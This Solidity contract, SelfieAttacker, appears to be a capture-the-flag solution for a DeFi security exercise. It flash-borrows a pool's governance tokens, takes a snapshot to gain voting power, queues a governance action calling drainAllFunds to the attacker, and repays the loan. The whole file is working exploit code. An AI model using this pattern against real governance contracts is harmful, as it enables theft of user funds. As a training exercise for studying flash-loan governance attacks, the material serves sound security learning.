// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ISelfiePool {
	function flashLoan(uint256) external;
}

interface ISimpleGovernance {
	function queueAction(address, bytes calldata, uint256) external returns (uint256);
	function executeAction(uint256) external payable;
}

interface ITokenSnapshot {
	function snapshot() external;
}

contract SelfieAttacker {
	address owner;

	address pool;
	address gov;
	address liq;
	
	ISelfiePool iPool;
	ISimpleGovernance iGov;
	IERC20 iLiq;

	uint256 public actionId;

	constructor(address _pool, address _gov, address _liq) {
		owner = msg.sender;
		
		pool = _pool;
		gov = _gov;
		liq = _liq;
		
		iPool = ISelfiePool(_pool);
		iGov = ISimpleGovernance(_gov);
		iLiq = IERC20(_liq);
	}

	function attack() external {
		uint256 poolBalance = iLiq.balanceOf(pool);
		iPool.flashLoan(poolBalance);
	}

	function receiveTokens(address, uint256 borrowAmount) external {
		ITokenSnapshot(liq).snapshot();
		bytes memory payload = abi.encodeWithSignature("drainAllFunds(address)", owner);
		actionId = iGov.queueAction(pool, payload, 0);
		iLiq.transfer(pool, borrowAmount);
	}

}
